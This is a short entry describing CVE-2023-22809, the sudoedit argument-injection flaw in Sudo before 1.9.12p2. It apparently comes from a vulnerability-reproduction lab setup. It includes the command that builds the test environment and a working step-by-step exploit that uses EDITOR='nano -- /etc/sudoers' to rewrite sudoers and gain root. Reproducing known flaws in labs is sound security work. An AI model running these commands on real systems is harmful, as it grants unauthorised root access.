# CVE-2023-22809

### Description
sudoedit in Sudo before 1.9.12p2 mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process which can lead to privilege escalation.
The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.

### Command to run
```shell
python -m decret --number 2023-22809 --release bullseye --directory sudoedit-2023 --selenium
```

### Simple testing method

```shell
echo "toto ALL=(ALL:ALL) sudoedit /etc/hosts" >> /etc/sudoers
su toto
cd
id
sudoedit /etc/hosts # Operation accepted, because added in /etc/sudoers
sudo nano /etc/passwd # Operation denied
sudoedit /etc/sudoers # Operation denied
EDITOR="nano -- /etc/sudoers" sudoedit /etc/hosts # Operation accepted
# change to toto ALL=(ALL:ALL) ALL
sudo nano /etc/passwd # Operation accepted
```
You can edit the file and then get root access.
